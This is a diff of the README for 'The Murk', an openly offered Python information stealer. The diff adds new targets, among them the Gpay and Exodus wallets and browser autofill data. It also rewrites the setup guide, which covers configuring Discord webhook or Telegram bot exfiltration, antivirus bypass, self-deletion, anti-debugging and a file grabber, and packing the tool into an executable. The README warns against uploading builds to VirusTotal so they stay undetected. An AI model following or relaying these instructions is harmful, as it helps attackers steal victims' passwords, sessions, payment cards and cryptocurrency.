@@ -2,14 +2,14 @@
 ![LOGO](Images/pxfulllogo.png)
 <img src="https://img.shields.io/badge/Python-FFD43B?style=for-the-badge&logo=python&logoColor=blue">
 <img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
-<img src="https://img.shields.io/badge/tests-98/100-76B900?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/tests-100/100-76B900?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
-<img src="https://img.shields.io/badge/The%20Murk-v9.2.7-blue?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/The%20Murk-v9.3.0-blue?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/platform-windows-989898?style=for-the-badge&logo=&logoColor=whit">
 
 
-🔐open source turbo🚀 stealer written on Python, all logs will be sent using discord webhooks, telegram bot or XMPP bot.
-[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v9.2.7)
+**🔐Powerful multi-platform stealer with a huge pack of grabbed data. Wallets stealer, browsers stealer, sessions stealer, etc. All logs will be sent using discord webhooks or telegram bot.**
+[Download the latest release(outdated, only manual build support)](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v9.2.7)
 
 ⭐Please, star this repo if it was helpful⭐
 
@@ -84,7 +84,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
    * 📢Telegram sessions
    * 📢Viber sessions
    * 📢Pidgin sessions
-   * 📢Discord sessions + token-grabber + pwd-grabber
+   * 📢Discord sessions + token-grabber
    * 📢Skype sessions
    * 📢WhatsApp sessions
    * 📢And more
@@ -99,9 +99,11 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
 * 💳Wallets
    * 💵PayPal
    * 💵Kivi
+   * 💵Gpay
    * 📈Binance
    * 📈Metamask
    * 📈Atomic
+   * 📈Exodus
    * 💵And more
 * 🌐Browsers
     * 🔗Chrome
@@ -110,6 +112,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
         * 📝History
         * 📥Downloads
         * 🧩Extensions
+        * 🖋Autofills
         * 💳Cards
     * 🔗Firefox
         * 🔑Passwords
@@ -117,6 +120,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
         * 📝History
         * 📥Downloads
         * 🧩Extensions
+        * 🖋Autofills
         * 💳Cards
     * 🔗Opera
         * 🔑Passwords
@@ -124,6 +128,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
         * 📝History
         * 📥Downloads
         * 🧩Extensions
+        * 🖋Autofills
         * 💳Cards
     * 🔗Edge
         * 🔑Passwords
@@ -131,6 +136,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
         * 📝History
         * 📥Downloads
         * 🧩Extensions
+        * 🖋Autofills
         * 💳Cards
     * 🔗Brave
         * 🔑Passwords
@@ -138,6 +144,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
         * 📝History
         * 📥Downloads
         * 🧩Extensions
+        * 🖋Autofills
         * 💳Cards
     * 🔗And more
 * 📡VPN
@@ -152,63 +159,45 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
     * 💉AV bypass
     * 🎭Self destruction
 ---
-### 🔨Building(using builder)
-
-### 🎮For Discord
-__So firstly you need to download [python](https://www.python.org/downloads/). Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v9.2.7). 
-After that, you need to create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks#conclusion).
-Finally, insert the name and webhook link in the builder. Better use building using pyarmor. And wait, secure building will take about 2 minutes.__
-
-### 📨For Telegram
-So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. Then, you need to save token and bot name. 
-Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and save the id.  
-Insert this data in builder console. Better use building using pyarmor. And wait, secure building will take about 2 minutes.
-
----
 
 ### 🔨Building(manually)
+**Configuring**
 
-### 🎮For Discord
-Insert your name and webhook link in the `config\config.py` here
-```
-enableFileGrabber = False #enable file grabber
-oneStart = False #enable this if you want logs to come only from unique computers
-avbypass = False #enable antiviruses bypass
-selfDestruct = False #deletes itself after stealing
-debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
+Foremost, download the source code. Then go to `The Murk\preferences` dir and open `config.py` in any text editor. There you'll see some vars, here is an explanation of them:
 
-sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
-discordData = ["url of your WebHook","name of that WebHook"]
-```
-and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
+> * `enableFileGrabber`
+> 
+> If you set this var as `True`, all files with extensions `.txt; .docx; .csv; .xls; .png; .jpg` will be collected from computer and sent to you
+> 
+> * `oneStart`
+> 
+> If you set this var as `True`, the application will be able to run only once on the same pc
+>
+> * `avbypass`
+> 
+> If you set this var as `True`, the application will automatically add itself to the whitelist of AV and make a copy of itself in case of deleting
+>
+> * `selfDestruct`
+>
+> If you set this var as `True`, the application will automatically delete itself after completing
+>
+> * `debuging`
+> 
+> disables AntiDebug (don't change if you don't know what it is responsible for)
 
-### 📨For Telegram
-Insert your link and chat ID in the `config\config.py` here
-```
-enableFileGrabber = False #enable file grabber
-oneStart = False #enable this if you want logs to come only from unique computers
-avbypass = False #enable antiviruses bypass
-selfDestruct = False #deletes itself after stealing
-debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
+Now let's figure out how to fill out the fields of `sendData`.
 
-sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
-TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
-```
-and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
+**For Discord**
 
-### 📡For XMPP
-Insert your jabber id, password and recipient  link in the `config\config.py` here
-```
-enableFileGrabber = False #enable file grabber
-oneStart = False #enable this if you want logs to come only from unique computers
-avbypass = False #enable antiviruses bypass
-selfDestruct = False #deletes itself after stealing
-debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
+So firstly, create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks#conclusion). Then, insert the webhook link in a separate field as in example `[0, "url of your WebHook", "null"]`.
 
-sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
-xmppData = ["jabberid","jabberpassword","jabberreceiver"]
-```
-and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
+**For Telegram**
+
+So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot, copy HTTP API of bot. Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and copy the id too. Then, insert the HTTP API and the id in a separate fields as in example `[1, "HTTP API", "chat ID"]`, don't forget to change the first var from 0 to 1.
+
+**Packing**
+
+Finally, to let all this deal work you need to download [python](https://www.python.org/downloads/). Then open cmd in The Murk dir insert in the console `pip install -r requirements.txt`, and wait till all downloads are completed. To pack all of it into an exe file just run `pack.bat`, and wait till the end of packing. The exe file gonna be placed in the dist folder.
 
 ---
 ### ❌Builder errors
